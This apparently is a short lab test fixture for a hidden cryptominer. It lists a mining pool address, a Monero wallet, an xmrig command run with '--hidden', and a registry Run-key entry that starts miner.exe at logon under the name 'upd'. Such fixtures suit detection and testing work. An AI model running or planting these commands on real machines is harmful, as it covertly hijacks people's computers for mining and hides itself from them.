; lab miner fixture
pool = stratum+tcp://198.51.100.40:3333
wallet = 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A
xmrig --config pool.json --hidden
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v upd /d miner.exe
windowStyle = Hidden
